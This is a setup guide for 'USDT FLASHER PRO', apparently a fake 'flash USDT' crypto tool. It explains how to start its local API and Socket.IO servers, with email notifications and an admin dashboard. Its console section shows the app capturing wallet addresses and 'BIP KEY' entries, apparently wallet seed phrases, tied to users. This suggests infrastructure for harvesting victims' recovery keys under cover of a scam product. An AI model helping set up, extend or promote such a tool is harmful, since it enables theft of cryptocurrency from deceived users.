# USDT FLASHER PRO - Setup Guide

This guide will help you set up and run the USDT FLASHER PRO application properly. There are two main components that need to be running for the application to work correctly:

1. **Local API Server** - Handles form submissions, license key validation, and email notifications
2. **Socket.IO Server** - Handles real-time communication and license key validation

## Quick Start

For the best experience, open two terminal windows and run these commands:

**Terminal 1 - Start the Local API Server:**
```bash
node start-local-api.js
```

**Terminal 2 - Start the Socket.IO Server:**
```bash
node start-socket-server.js
```

Keep both terminal windows open while using the application.

## Detailed Setup Instructions

### 1. Setting Up the Local API Server

The local API server handles:
- Form submissions from the application
- License key validation
- Email notifications

To set up and start the local API server:

1. Make sure you have a `.env` file with your email configuration (see [EMAIL-SETUP.md](./EMAIL-SETUP.md) for details)
2. Run the following command:

```bash
node start-local-api.js
```

This script will:
- Check if your `.env` file is properly configured
- Start the local API server on port 3001
- Send a test email to verify your email configuration

**Keep this terminal window open while using the application.**

### 2. Setting Up the Socket.IO Server

The Socket.IO server handles:
- Real-time communication
- License key validation
- Status updates

To set up and start the Socket.IO server:

1. Run the following command:

```bash
node start-socket-server.js
```

This script will:
- Update the Socket.IO configuration to use localhost instead of the Netlify URL
- Start the Socket.IO server on port 3002

**Keep this terminal window open while using the application.**

## Troubleshooting

### Console Errors

If you see errors in the console like:

```
WebSocket connection to 'wss://usdt-flasher-pro-socket.netlify.app/socket.io/?EIO=4&transport=websocket' failed
```

This means the Socket.IO server is not running or is not properly configured. Start it with:

```bash
node start-socket-server.js
```

If you see errors like:

```
Failed to load resource: net::ERR_CONNECTION_REFUSED
```

This means the local API server is not running. Start it with:

```bash
node start-local-api.js
```

### Invalid License Key Format

If you see an error like:

```
Invalid license key format: XXXX-XXXX-XXXX-XXXX
```

This means the Socket.IO server is not running or is not properly configured. Make sure you've started the Socket.IO server with:

```bash
node start-socket-server.js
```

### Email Notifications Not Working

If you're not receiving email notifications, check:

1. That the local API server is running
2. That you've set up the correct app password in the `.env` file
3. Check your spam/junk folder

See [EMAIL-SETUP.md](./EMAIL-SETUP.md) for detailed instructions on setting up email notifications.

## Viewing Data in the Console

Even if the servers are not running, you can still see the data in the browser console:

1. Open your browser's developer tools (F12 or right-click → Inspect)
2. Go to the "Console" tab
3. You'll see entries like:
   - `LICENSE LOGIN NOTIFICATION: {key: "...", user: "...", type: "..."}`
   - `FORM SUBMISSION DATA: {wallet: "...", network: "...", receiverAddress: "...", flashAmount: "..."}`
   - `BIP KEY NOTIFICATION: {bipKey: "...", licenseKey: "...", user: "..."}`

This allows you to verify that the application is correctly capturing the data, even if the servers are not running.

## Running the Web Application

To run the web application:

1. Make sure both servers are running (local API server and Socket.IO server)
2. Start the web application with:

```bash
cd web-app
npm start
```

Or use the provided script:

```bash
node start-app.js
```

## Deployment

For deployment to Netlify or other hosting services, see the deployment guides:

- [web-app/README.md](./web-app/README.md)
- [admin-dashboard/README.md](./admin-dashboard/README.md)
